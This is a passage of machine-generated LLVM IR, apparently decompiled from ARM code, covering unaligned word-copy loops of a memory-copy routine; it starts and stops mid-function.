dec_label_pc_1818c:                               ; preds = %dec_label_pc_18180, %dec_label_pc_18140, %dec_label_pc_1818c
  %v1_18198 = phi i32 [ %v4_18198, %dec_label_pc_1818c ], [ %v12_18174, %dec_label_pc_18180 ], [ %v0_1824c76, %dec_label_pc_18140 ]
  %v0_1818c = load i32, i32* %lr.global-to-local, align 4
  %v3_1818c = udiv i32 %v0_1818c, 256
  store i32 %v3_1818c, i32* %ip.global-to-local, align 4
  %v0_18190 = load i32, i32* %r1.global-to-local, align 4
  %v1_18190 = inttoptr i32 %v0_18190 to i32*
  %v2_18190 = load i32, i32* %v1_18190, align 4
  store i32 %v2_18190, i32* %lr.global-to-local, align 4
  %v4_18190 = add i32 %v0_18190, 4
  store i32 %v4_18190, i32* %r1.global-to-local, align 4
  %v4_18194 = mul i32 %v2_18190, 16777216
  %v5_18194 = or i32 %v4_18194, %v3_1818c
  store i32 %v5_18194, i32* @ip, align 4
  %v2_18198 = inttoptr i32 %v1_18198 to i32*
  store i32 %v5_18194, i32* %v2_18198, align 4
  %v3_18198 = load i32, i32* @r0, align 4
  %v4_18198 = add i32 %v3_18198, 4
  store i32 %v4_18198, i32* @r0, align 4
  %v0_1819c = load i32, i32* %r2.global-to-local, align 4
  %v1_1819c = add i32 %v0_1819c, -4
  store i32 %v1_1819c, i32* %r2.global-to-local, align 4
  %v3_1819c = sub i32 3, %v0_1819c
  %v4_1819c = and i32 %v3_1819c, %v0_1819c
  %v5_1819c = icmp slt i32 %v4_1819c, 0
  %v6_1819c = icmp slt i32 %v1_1819c, 0
  %v2_181a0 = xor i1 %v6_1819c, %v5_1819c
  br i1 %v2_181a0, label %dec_label_pc_181a4.loopexit, label %dec_label_pc_1818c

dec_label_pc_181a4.loopexit:                      ; preds = %dec_label_pc_1818c
  %v7_1819c = icmp eq i32 %v0_1819c, 4
  store i1 %v5_1819c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1819c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1819c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_181a4

dec_label_pc_181a4:                               ; preds = %dec_label_pc_181a4.loopexit, %dec_label_pc_18180
  %v0_180cc59 = phi i32 [ %v1_1819c, %dec_label_pc_181a4.loopexit ], [ %v1_18184, %dec_label_pc_18180 ]
  %v0_181a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_181a4 = add i32 %v0_181a4, -3
  store i32 %v1_181a4, i32* @r1, align 4
  br label %bb140

dec_label_pc_181ac:                               ; preds = %dec_label_pc_1812c
  br i1 %v2_181b0, label %dec_label_pc_181f8, label %dec_label_pc_181b4

dec_label_pc_181b4:                               ; preds = %dec_label_pc_181ac
  store i32 %v1_181ac, i32* %r2.global-to-local, align 4
  %v3_181b8 = load i32, i32* @r4, align 4
  store i32 %v3_181b8, i32* %stack_var_-16, align 4
  %v6_181b8 = load i32, i32* @r5, align 4
  store i32 %v6_181b8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_181bc

dec_label_pc_181bc:                               ; preds = %dec_label_pc_181bc.dec_label_pc_181bc_crit_edge, %dec_label_pc_181b4
  %v0_181e0 = phi i32 [ %v12_181e0, %dec_label_pc_181bc.dec_label_pc_181bc_crit_edge ], [ %v0_1824c76, %dec_label_pc_181b4 ]
  %v0_181c0 = phi i32 [ %v0_181c0.pre, %dec_label_pc_181bc.dec_label_pc_181bc_crit_edge ], [ %v4_18130, %dec_label_pc_181b4 ]
  %v0_181bc = phi i32 [ %v0_181bc.pre, %dec_label_pc_181bc.dec_label_pc_181bc_crit_edge ], [ %v2_18130, %dec_label_pc_181b4 ]
  %v3_181bc = udiv i32 %v0_181bc, 65536
  %v1_181c0 = inttoptr i32 %v0_181c0 to i32*
  %v2_181c0 = load i32, i32* %v1_181c0, align 4
  store i32 %v2_181c0, i32* %r4.global-to-local, align 4
  %v3_181c0 = add i32 %v0_181c0, 4
  %v4_181c0 = inttoptr i32 %v3_181c0 to i32*
  %v5_181c0 = load i32, i32* %v4_181c0, align 4
  store i32 %v5_181c0, i32* %r5.global-to-local, align 4
  %v6_181c0 = add i32 %v0_181c0, 8
  %v7_181c0 = inttoptr i32 %v6_181c0 to i32*
  %v8_181c0 = load i32, i32* %v7_181c0, align 4
  store i32 %v8_181c0, i32* %ip.global-to-local, align 4
  %v9_181c0 = add i32 %v0_181c0, 12
  %v10_181c0 = inttoptr i32 %v9_181c0 to i32*
  %v11_181c0 = load i32, i32* %v10_181c0, align 4
  store i32 %v11_181c0, i32* %lr.global-to-local, align 4
  %v12_181c0 = add i32 %v0_181c0, 16
  store i32 %v12_181c0, i32* %r1.global-to-local, align 4
  %v4_181c4 = mul i32 %v2_181c0, 65536
  %v5_181c4 = or i32 %v4_181c4, %v3_181bc
  store i32 %v5_181c4, i32* @r3, align 4
  %v3_181c8 = udiv i32 %v2_181c0, 65536
  %v4_181cc = mul i32 %v5_181c0, 65536
  %v5_181cc = or i32 %v4_181cc, %v3_181c8
  store i32 %v5_181cc, i32* %r4.global-to-local, align 4
  %v3_181d0 = udiv i32 %v5_181c0, 65536
  %v4_181d4 = mul i32 %v8_181c0, 65536
  %v5_181d4 = or i32 %v4_181d4, %v3_181d0
  store i32 %v5_181d4, i32* %r5.global-to-local, align 4
  %v3_181d8 = udiv i32 %v8_181c0, 65536
  %v4_181dc = mul i32 %v11_181c0, 65536
  %v5_181dc = or i32 %v4_181dc, %v3_181d8
  store i32 %v5_181dc, i32* @ip, align 4
  %v1_181e0 = inttoptr i32 %v0_181e0 to i32*
  store i32 %v5_181c4, i32* %v1_181e0, align 4
  %v3_181e0 = add i32 %v0_181e0, 4
  %v4_181e0 = inttoptr i32 %v3_181e0 to i32*
  %v5_181e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_181e0, i32* %v4_181e0, align 4
  %v6_181e0 = add i32 %v0_181e0, 8
  %v7_181e0 = inttoptr i32 %v6_181e0 to i32*
  %v8_181e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_181e0, i32* %v7_181e0, align 4
  %v9_181e0 = add i32 %v0_181e0, 12
  %v10_181e0 = inttoptr i32 %v9_181e0 to i32*
  %v11_181e0 = load i32, i32* @ip, align 4
  store i32 %v11_181e0, i32* %v10_181e0, align 4
  %v12_181e0 = add i32 %v0_181e0, 16
  store i32 %v12_181e0, i32* @r0, align 4
  %v0_181e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_181e4 = add i32 %v0_181e4, -16
  store i32 %v1_181e4, i32* %r2.global-to-local, align 4
  %v3_181e4 = sub i32 15, %v0_181e4
  %v4_181e4 = and i32 %v3_181e4, %v0_181e4
  %v5_181e4 = icmp slt i32 %v4_181e4, 0
  %v6_181e4 = icmp slt i32 %v1_181e4, 0
  %v2_181e8 = xor i1 %v6_181e4, %v5_181e4
  br i1 %v2_181e8, label %dec_label_pc_181ec, label %dec_label_pc_181bc.dec_label_pc_181bc_crit_edge

dec_label_pc_181bc.dec_label_pc_181bc_crit_edge:  ; preds = %dec_label_pc_181bc
  %v0_181bc.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_181c0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_181bc

dec_label_pc_181ec:                               ; preds = %dec_label_pc_181bc
  %v2_181ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_181ec, i32* @r4, align 4
  %v5_181ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_181ec, i32* @r5, align 4
  %v1_181f0 = add i32 %v0_181e4, -4
  store i32 %v1_181f0, i32* %r2.global-to-local, align 4
  %v3_181f0 = add i32 %v0_181e4, 2147483632
  %v4_181f0 = and i32 %v1_181f0, %v3_181f0
  %v5_181f0 = icmp slt i32 %v4_181f0, 0
  store i1 %v5_181f0, i1* %cpsr_v.global-to-local, align 1
  %v6_181f0 = icmp slt i32 %v1_181f0, 0
  store i1 %v6_181f0, i1* %cpsr_n.global-to-local, align 1
  %v7_181f0 = icmp eq i32 %v1_181f0, 0
  store i1 %v7_181f0, i1* %cpsr_z.global-to-local, align 1
  %v2_181f4 = xor i1 %v6_181f0, %v5_181f0
  br i1 %v2_181f4, label %dec_label_pc_18210, label %dec_label_pc_181f8

dec_label_pc_181f8:                               ; preds = %dec_label_pc_181ec, %dec_label_pc_181ac, %dec_label_pc_181f8
  %v1_18204 = phi i32 [ %v4_18204, %dec_label_pc_181f8 ], [ %v12_181e0, %dec_label_pc_181ec ], [ %v0_1824c76, %dec_label_pc_181ac ]
  %v0_181f8 = load i32, i32* %lr.global-to-local, align 4
  %v3_181f8 = udiv i32 %v0_181f8, 65536
  store i32 %v3_181f8, i32* %ip.global-to-local, align 4
  %v0_181fc = load i32, i32* %r1.global-to-local, align 4
  %v1_181fc = inttoptr i32 %v0_181fc to i32*
  %v2_181fc = load i32, i32* %v1_181fc, align 4
  store i32 %v2_181fc, i32* %lr.global-to-local, align 4
  %v4_181fc = add i32 %v0_181fc, 4
  store i32 %v4_181fc, i32* %r1.global-to-local, align 4
  %v4_18200 = mul i32 %v2_181fc, 65536
  %v5_18200 = or i32 %v4_18200, %v3_181f8
  store i32 %v5_18200, i32* @ip, align 4
  %v2_18204 = inttoptr i32 %v1_18204 to i32*
  store i32 %v5_18200, i32* %v2_18204, align 4
  %v3_18204 = load i32, i32* @r0, align 4
  %v4_18204 = add i32 %v3_18204, 4
  store i32 %v4_18204, i32* @r0, align 4
  %v0_18208 = load i32, i32* %r2.global-to-local, align 4
  %v1_18208 = add i32 %v0_18208, -4
  store i32 %v1_18208, i32* %r2.global-to-local, align 4
  %v3_18208 = sub i32 3, %v0_18208
  %v4_18208 = and i32 %v3_18208, %v0_18208
  %v5_18208 = icmp slt i32 %v4_18208, 0
  %v6_18208 = icmp slt i32 %v1_18208, 0
  %v2_1820c = xor i1 %v6_18208, %v5_18208
  br i1 %v2_1820c, label %dec_label_pc_18210.loopexit, label %dec_label_pc_181f8

dec_label_pc_18210.loopexit:                      ; preds = %dec_label_pc_181f8
  %v7_18208 = icmp eq i32 %v0_18208, 4
  store i1 %v5_18208, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18208, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18208, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18210

dec_label_pc_18210:                               ; preds = %dec_label_pc_18210.loopexit, %dec_label_pc_181ec
  %v0_180cc60 = phi i32 [ %v1_18208, %dec_label_pc_18210.loopexit ], [ %v1_181f0, %dec_label_pc_181ec ]
  %v0_18210 = load i32, i32* %r1.global-to-local, align 4
  %v1_18210 = add i32 %v0_18210, -2
  store i32 %v1_18210, i32* @r1, align 4
  br label %bb140

dec_label_pc_18218:                               ; preds = %dec_label_pc_1812c
  br i1 %v2_181b0, label %dec_label_pc_18264, label %dec_label_pc_18220

dec_label_pc_18220:                               ; preds = %dec_label_pc_18218
  store i32 %v1_181ac, i32* %r2.global-to-local, align 4
  %v3_18224 = load i32, i32* @r4, align 4
  store i32 %v3_18224, i32* %stack_var_-16, align 4
  %v6_18224 = load i32, i32* @r5, align 4
  store i32 %v6_18224, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18228

dec_label_pc_18228:                               ; preds = %dec_label_pc_18228.dec_label_pc_18228_crit_edge, %dec_label_pc_18220
  %v0_1824c = phi i32 [ %v12_1824c, %dec_label_pc_18228.dec_label_pc_18228_crit_edge ], [ %v0_1824c76, %dec_label_pc_18220 ]
  %v0_1822c = phi i32 [ %v0_1822c.pre, %dec_label_pc_18228.dec_label_pc_18228_crit_edge ], [ %v4_18130, %dec_label_pc_18220 ]
  %v0_18228 = phi i32 [ %v0_18228.pre, %dec_label_pc_18228.dec_label_pc_18228_crit_edge ], [ %v2_18130, %dec_label_pc_18220 ]
  %v3_18228 = udiv i32 %v0_18228, 16777216
  %v1_1822c = inttoptr i32 %v0_1822c to i32*
  %v2_1822c = load i32, i32* %v1_1822c, align 4
  store i32 %v2_1822c, i32* %r4.global-to-local, align 4
  %v3_1822c = add i32 %v0_1822c, 4
  %v4_1822c = inttoptr i32 %v3_1822c to i32*
  %v5_1822c = load i32, i32* %v4_1822c, align 4
  store i32 %v5_1822c, i32* %r5.global-to-local, align 4
  %v6_1822c = add i32 %v0_1822c, 8
  %v7_1822c = inttoptr i32 %v6_1822c to i32*
  %v8_1822c = load i32, i32* %v7_1822c, align 4
  store i32 %v8_1822c, i32* %ip.global-to-local, align 4
  %v9_1822c = add i32 %v0_1822c, 12
  %v10_1822c = inttoptr i32 %v9_1822c to i32*
  %v11_1822c = load i32, i32* %v10_1822c, align 4
  store i32 %v11_1822c, i32* %lr.global-to-local, align 4
  %v12_1822c = add i32 %v0_1822c, 16
  store i32 %v12_1822c, i32* %r1.global-to-local, align 4
  %v4_18230 = mul i32 %v2_1822c, 256
  %v5_18230 = or i32 %v4_18230, %v3_18228
  store i32 %v5_18230, i32* @r3, align 4
  %v3_18234 = udiv i32 %v2_1822c, 16777216
  %v4_18238 = mul i32 %v5_1822c, 256
  %v5_18238 = or i32 %v4_18238, %v3_18234
  store i32 %v5_18238, i32* %r4.global-to-local, align 4
  %v3_1823c = udiv i32 %v5_1822c, 16777216
  %v4_18240 = mul i32 %v8_1822c, 256
  %v5_18240 = or i32 %v4_18240, %v3_1823c
  store i32 %v5_18240, i32* %r5.global-to-local, align 4
  %v3_18244 = udiv i32 %v8_1822c, 16777216
  %v4_18248 = mul i32 %v11_1822c, 256
  %v5_18248 = or i32 %v4_18248, %v3_18244
  store i32 %v5_18248, i32* @ip, align 4
  %v1_1824c = inttoptr i32 %v0_1824c to i32*
  store i32 %v5_18230, i32* %v1_1824c, align 4
  %v3_1824c = add i32 %v0_1824c, 4
  %v4_1824c = inttoptr i32 %v3_1824c to i32*
  %v5_1824c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1824c, i32* %v4_1824c, align 4
  %v6_1824c = add i32 %v0_1824c, 8
  %v7_1824c = inttoptr i32 %v6_1824c to i32*
  %v8_1824c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1824c, i32* %v7_1824c, align 4
  %v9_1824c = add i32 %v0_1824c, 12
  %v10_1824c = inttoptr i32 %v9_1824c to i32*
  %v11_1824c = load i32, i32* @ip, align 4
  store i32 %v11_1824c, i32* %v10_1824c, align 4
  %v12_1824c = add i32 %v0_1824c, 16
  store i32 %v12_1824c, i32* @r0, align 4
  %v0_18250 = load i32, i32* %r2.global-to-local, align 4
  %v1_18250 = add i32 %v0_18250, -16
  store i32 %v1_18250, i32* %r2.global-to-local, align 4
  %v3_18250 = sub i32 15, %v0_18250
  %v4_18250 = and i32 %v3_18250, %v0_18250
  %v5_18250 = icmp slt i32 %v4_18250, 0
  %v6_18250 = icmp slt i32 %v1_18250, 0
  %v2_18254 = xor i1 %v6_18250, %v5_18250
  br i1 %v2_18254, label %dec_label_pc_18258, label %dec_label_pc_18228.dec_label_pc_18228_crit_edge

dec_label_pc_18228.dec_label_pc_18228_crit_edge:  ; preds = %dec_label_pc_18228
  %v0_18228.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1822c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18228

dec_label_pc_18258:                               ; preds = %dec_label_pc_18228
  %v2_18258 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18258, i32* @r4, align 4
  %v5_18258 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18258, i32* @r5, align 4
  %v1_1825c = add i32 %v0_18250, -4
  store i32 %v1_1825c, i32* %r2.global-to-local, align 4
  %v3_1825c = add i32 %v0_18250, 2147483632
  %v4_1825c = and i32 %v1_1825c, %v3_1825c
  %v5_1825c = icmp slt i32 %v4_1825c, 0
  store i1 %v5_1825c, i1* %cpsr_v.global-to-local, align 1
  %v6_1825c = icmp slt i32 %v1_1825c, 0
  store i1 %v6_1825c, i1* %cpsr_n.global-to-local, align 1
  %v7_1825c = icmp eq i32 %v1_1825c, 0
  store i1 %v7_1825c, i1* %cpsr_z.global-to-local, align 1
  %v2_18260 = xor i1 %v6_1825c, %v5_1825c
  br i1 %v2_18260, label %dec_label_pc_1827c, label %dec_label_pc_18264

dec_label_pc_18264:                               ; preds = %dec_label_pc_18258, %dec_label_pc_18218, %dec_label_pc_18264
  %v1_18270 = phi i32 [ %v4_18270, %dec_label_pc_18264 ], [ %v12_1824c, %dec_label_pc_18258 ], [ %v0_1824c76, %dec_label_pc_18218 ]
  %v0_18264 = load i32, i32* %lr.global-to-local, align 4
  %v3_18264 = udiv i32 %v0_18264, 16777216
  store i32 %v3_18264, i32* %ip.global-to-local, align 4
  %v0_18268 = load i32, i32* %r1.global-to-local, align 4
  %v1_18268 = inttoptr i32 %v0_18268 to i32*
  %v2_18268 = load i32, i32* %v1_18268, align 4
  store i32 %v2_18268, i32* %lr.global-to-local, align 4
  %v4_18268 = add i32 %v0_18268, 4
  store i32 %v4_18268, i32* %r1.global-to-local, align 4
  %v4_1826c = mul i32 %v2_18268, 256
  %v5_1826c = or i32 %v4_1826c, %v3_18264
  store i32 %v5_1826c, i32* @ip, align 4
  %v2_18270 = inttoptr i32 %v1_18270 to i32*
  store i32 %v5_1826c, i32* %v2_18270, align 4
  %v3_18270 = load i32, i32* @r0, align 4
  %v4_18270 = add i32 %v3_18270, 4
  store i32 %v4_18270, i32* @r0, align 4
  %v0_18274 = load i32, i32* %r2.global-to-local, align 4
  %v1_18274 = add i32 %v0_18274, -4
  store i32 %v1_18274, i32* %r2.global-to-local, align 4
  %v3_18274 = sub i32 3, %v0_18274
  %v4_18274 = and i32 %v3_18274, %v0_18274
  %v5_18274 = icmp slt i32 %v4_18274, 0
  %v6_18274 = icmp slt i32 %v1_18274, 0
  %v2_18278 = xor i1 %v6_18274, %v5_18274
  br i1 %v2_18278, label %dec_label_pc_1827c.loopexit, label %dec_label_pc_18264

dec_label_pc_1827c.loopexit:                      ; preds = %dec_label_pc_18264
  %v7_18274 = icmp eq i32 %v0_18274, 4
  store i1 %v5_18274, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18274, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18274, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1827c

dec_label_pc_1827c:                               ; preds = %dec_label_pc_1827c.loopexit, %dec_label_pc_18258
  %v0_180cc61 = phi i32 [ %v1_18274, %dec_label_pc_1827c.loopexit ], [ %v1_1825c, %dec_label_pc_18258 ]
  %v0_1827c = load i32, i32* %r1.global-to-local, align 4
  %v1_1827c = add i32 %v0_1827c, -1
  store i32 %v1_1827c, i32* @r1, align 4
  br label %bb140

dec_label_pc_18284:                               ; preds = %entry
  %v1_18284 = load i32, i32* @r2, align 4
  %v2_18284 = add i32 %v1_18284, %v0_18030
  store i32 %v2_18284, i32* %r1.global-to-local, align 4
  %v2_18288 = add i32 %v1_18284, %v1_18030
  store i32 %v2_18288, i32* %r0.global-to-local, align 4
  %v2_1828c = add i32 %v1_18284, -4
  store i32 %v2_1828c, i32* %r2.global-to-local, align 4
  %v4_1828c = sub i32 3, %v1_18284
  %v5_1828c = and i32 %v4_1828c, %v1_18284
  %v6_1828c = icmp slt i32 %v5_1828c, 0
  store i1 %v6_1828c, i1* %cpsr_v.global-to-local, align 1
  %v7_1828c = icmp slt i32 %v2_1828c, 0
  store i1 %v7_1828c, i1* %cpsr_n.global-to-local, align 1
  %v8_1828c = icmp eq i32 %v1_18284, 4
  store i1 %v8_1828c, i1* %cpsr_z.global-to-local, align 1
  %v5_18290 = icmp slt i32 %v1_18284, 4
  br i1 %v5_18290, label %bb150, label %dec_label_pc_18294

dec_label_pc_18294:                               ; preds = %dec_label_pc_18284
  %v1_18294 = urem i32 %v2_18288, 4
  store i32 %v1_18294, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18294 = icmp eq i32 %v1_18294, 0
  store i1 %v2_18294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18294, label %dec_label_pc_1829c, label %dec_label_pc_1833c

dec_label_pc_1829c:                               ; preds = %dec_label_pc_18294
  %v1_1829c = urem i32 %v2_18284, 4
  store i32 %v1_1829c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1829c = icmp eq i32 %v1_1829c, 0
  store i1 %v2_1829c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1829c, label %dec_label_pc_182a4, label %dec_label_pc_18368

dec_label_pc_182a4:                               ; preds = %dec_label_pc_1829c, %dec_label_pc_18360
  %v0_182bc37 = phi i32 [ %v2_18288, %dec_label_pc_1829c ], [ %v0_183b020, %dec_label_pc_18360 ]
  %v0_182b836 = phi i32 [ %v2_18284, %dec_label_pc_1829c ], [ %v0_18360, %dec_label_pc_18360 ]
  %v0_182a4 = phi i32 [ %v2_1828c, %dec_label_pc_1829c ], [ %v2_18358, %dec_label_pc_18360 ]
  %v2_182a4 = add i32 %v0_182a4, -8
  store i32 %v2_182a4, i32* %r2.global-to-local, align 4
  %v4_182a4 = sub i32 7, %v0_182a4
  %v5_182a4 = and i32 %v4_182a4, %v0_182a4
  %v6_182a4 = icmp slt i32 %v5_182a4, 0
  store i1 %v6_182a4, i1* %cpsr_v.global-to-local, align 1
  %v7_182a4 = icmp slt i32 %v2_182a4, 0
  store i1 %v7_182a4, i1* %cpsr_n.global-to-local, align 1
  %v8_182a4 = icmp eq i32 %v0_182a4, 8
  store i1 %v8_182a4, i1* %cpsr_z.global-to-local, align 1
  %v5_182a8 = icmp slt i32 %v0_182a4, 8
  br i1 %v5_182a8, label %dec_label_pc_182f4, label %dec_label_pc_182ac

dec_label_pc_182ac:                               ; preds = %dec_label_pc_182a4
  %v3_182ac = load i32, i32* @r4, align 4
  %v5_182ac = inttoptr i32 %v3_182ac to i8*
  store i8* %v5_182ac, i8** %stack_var_-8, align 4
  %v8_182ac = load i32, i32* @lr, align 4
  %v2_182b0 = add i32 %v0_182a4, -28
  store i32 %v2_182b0, i32* %r2.global-to-local, align 4
  %v4_182b0 = sub i32 27, %v0_182a4
  %v5_182b0 = and i32 %v4_182b0, %v2_182a4
  %v6_182b0 = icmp slt i32 %v5_182b0, 0
  store i1 %v6_182b0, i1* %cpsr_v.global-to-local, align 1
  %v7_182b0 = icmp slt i32 %v2_182b0, 0
  store i1 %v7_182b0, i1* %cpsr_n.global-to-local, align 1
  %v8_182b0 = icmp eq i32 %v2_182a4, 20
  store i1 %v8_182b0, i1* %cpsr_z.global-to-local, align 1
  %v5_182b4 = icmp slt i32 %v2_182a4, 20
  br i1 %v5_182b4, label %dec_label_pc_182d0, label %dec_label_pc_182b8

dec_label_pc_182b8:                               ; preds = %dec_label_pc_182ac, %dec_label_pc_182b8.dec_label_pc_182b8_crit_edge
  %v0_182bc = phi i32 [ %v1_182c4, %dec_label_pc_182b8.dec_label_pc_182b8_crit_edge ], [ %v0_182bc37, %dec_label_pc_182ac ]
  %v0_182b8 = phi i32 [ %v0_182b8.pre, %dec_label_pc_182b8.dec_label_pc_182b8_crit_edge ], [ %v0_182b836, %dec_label_pc_182ac ]
  %v1_182b8 = add i32 %v0_182b8, -4
  %v2_182b8 = inttoptr i32 %v1_182b8 to i32*
  %v3_182b8 = load i32, i32* %v2_182b8, align 4
  %v4_182b8 = add i32 %v0_182b8, -8
  %v5_182b8 = inttoptr i32 %v4_182b8 to i32*
  %v6_182b8 = load i32, i32* %v5_182b8, align 4
  store i32 %v6_182b8, i32* %r4.global-to-local, align 4
  %v7_182b8 = add i32 %v0_182b8, -12
  %v8_182b8 = inttoptr i32 %v7_182b8 to i32*
  %v9_182b8 = load i32, i32* %v8_182b8, align 4
  store i32 %v9_182b8, i32* %ip.global-to-local, align 4
  %v10_182b8 = add i32 %v0_182b8, -16
  %v11_182b8 = inttoptr i32 %v10_182b8 to i32*
  %v12_182b8 = load i32, i32* %v11_182b8, align 4
  store i32 %v12_182b8, i32* %lr.global-to-local, align 4
  store i32 %v10_182b8, i32* %r1.global-to-local, align 4
  %v1_182bc = add i32 %v0_182bc, -16
  %v2_182bc = inttoptr i32 %v1_182bc to i32*
  store i32 %v3_182b8, i32* %v2_182bc, align 4
  %v4_182bc = add i32 %v0_182bc, -12
  %v5_182bc = inttoptr i32 %v4_182bc to i32*
  %v6_182bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_182bc, i32* %v5_182bc, align 4
  %v7_182bc = add i32 %v0_182bc, -8
  %v8_182bc = inttoptr i32 %v7_182bc to i32*
  %v9_182bc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_182bc, i32* %v8_182bc, align 4
  %v10_182bc = add i32 %v0_182bc, -4
  %v11_182bc = inttoptr i32 %v10_182bc to i32*
  %v12_182bc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_182bc, i32* %v11_182bc, align 4
  store i32 %v1_182bc, i32* %r0.global-to-local, align 4
  %v0_182c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_182c0 = add i32 %v0_182c0, -4
  %v2_182c0 = inttoptr i32 %v1_182c0 to i32*
  %v3_182c0 = load i32, i32* %v2_182c0, align 4
  store i32 %v3_182c0, i32* @r3, align 4
  %v4_182c0 = add i32 %v0_182c0, -8
  %v5_182c0 = inttoptr i32 %v4_182c0 to i32*
  %v6_182c0 = load i32, i32* %v5_182c0, align 4
  store i32 %v6_182c0, i32* %r4.global-to-local, align 4
  %v7_182c0 = add i32 %v0_182c0, -12
  %v8_182c0 = inttoptr i32 %v7_182c0 to i32*
  %v9_182c0 = load i32, i32* %v8_182c0, align 4
  store i32 %v9_182c0, i32* @ip, align 4
  %v10_182c0 = add i32 %v0_182c0, -16
  %v11_182c0 = inttoptr i32 %v10_182c0 to i32*
  %v12_182c0 = load i32, i32* %v11_182c0, align 4
  store i32 %v12_182c0, i32* %lr.global-to-local, align 4
  store i32 %v10_182c0, i32* %r1.global-to-local, align 4
  %v1_182c4 = add i32 %v0_182bc, -32
  %v2_182c4 = inttoptr i32 %v1_182c4 to i32*
  store i32 %v3_182c0, i32* %v2_182c4, align 4
  %v4_182c4 = add i32 %v0_182bc, -28
  %v5_182c4 = inttoptr i32 %v4_182c4 to i32*
  %v6_182c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_182c4, i32* %v5_182c4, align 4
  %v7_182c4 = add i32 %v0_182bc, -24
  %v8_182c4 = inttoptr i32 %v7_182c4 to i32*
  %v9_182c4 = load i32, i32* @ip, align 4
  store i32 %v9_182c4, i32* %v8_182c4, align 4
  %v10_182c4 = add i32 %v0_182bc, -20
  %v11_182c4 = inttoptr i32 %v10_182c4 to i32*
  %v12_182c4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_182c4, i32* %v11_182c4, align 4
  store i32 %v1_182c4, i32* %r0.global-to-local, align 4
  %v0_182c8 = load i32, i32* %r2.global-to-local, align 4
  %v2_182c8 = add i32 %v0_182c8, -32
  store i32 %v2_182c8, i32* %r2.global-to-local, align 4
  %v6_182cc = icmp slt i32 %v0_182c8, 32
  br i1 %v6_182cc, label %dec_label_pc_182d0.loopexit, label %dec_label_pc_182b8.dec_label_pc_182b8_crit_edge

dec_label_pc_182b8.dec_label_pc_182b8_crit_edge:  ; preds = %dec_label_pc_182b8
  %v0_182b8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_182b8

dec_label_pc_182d0.loopexit:                      ; preds = %dec_label_pc_182b8
  %v4_182c8 = sub i32 31, %v0_182c8
  %v5_182c8 = and i32 %v4_182c8, %v0_182c8
  %v6_182c8 = icmp slt i32 %v5_182c8, 0
  %v7_182c8 = icmp slt i32 %v2_182c8, 0
  store i1 %v6_182c8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_182c8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_182d0

dec_label_pc_182d0:                               ; preds = %dec_label_pc_182d0.loopexit, %dec_label_pc_182ac
  %v6_182d8 = phi i32 [ %v1_182c4, %dec_label_pc_182d0.loopexit ], [ %v0_182bc37, %dec_label_pc_182ac ]
  %v0_182e0.pr = phi i32 [ %v2_182c8, %dec_label_pc_182d0.loopexit ], [ %v2_182b0, %dec_label_pc_182ac ]
  %v4_182d0 = add i32 %v0_182e0.pr, 16
  %v6_182d0 = sub i32 0, %v0_182e0.pr
  %v7_182d0 = and i32 %v4_182d0, %v6_182d0
  %v8_182d0 = icmp slt i32 %v7_182d0, 0
  store i1 %v8_182d0, i1* %cpsr_v.global-to-local, align 1
  %v9_182d0 = icmp slt i32 %v4_182d0, 0
  store i1 %v9_182d0, i1* %cpsr_n.global-to-local, align 1
  %v10_182d0 = icmp eq i32 %v4_182d0, 0
  store i1 %v10_182d0, i1* %cpsr_z.global-to-local, align 1
  %v5_182d4 = icmp slt i32 %v0_182e0.pr, -16
  br i1 %v5_182d4, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_182d0
  %v6_182d4 = load i32, i32* %r1.global-to-local, align 4
  %v7_182d4 = add i32 %v6_182d4, -4
  %v8_182d4 = inttoptr i32 %v7_182d4 to i32*
  %v9_182d4 = load i32, i32* %v8_182d4, align 4
  store i32 %v9_182d4, i32* @r3, align 4
  %v10_182d4 = add i32 %v6_182d4, -8
  %v11_182d4 = inttoptr i32 %v10_182d4 to i32*
  %v12_182d4 = load i32, i32* %v11_182d4, align 4
  store i32 %v12_182d4, i32* %r4.global-to-local, align 4
  %v13_182d4 = add i32 %v6_182d4, -12
  %v14_182d4 = inttoptr i32 %v13_182d4 to i32*
  %v15_182d4 = load i32, i32* %v14_182d4, align 4
  store i32 %v15_182d4, i32* @ip, align 4
  %v16_182d4 = add i32 %v6_182d4, -16
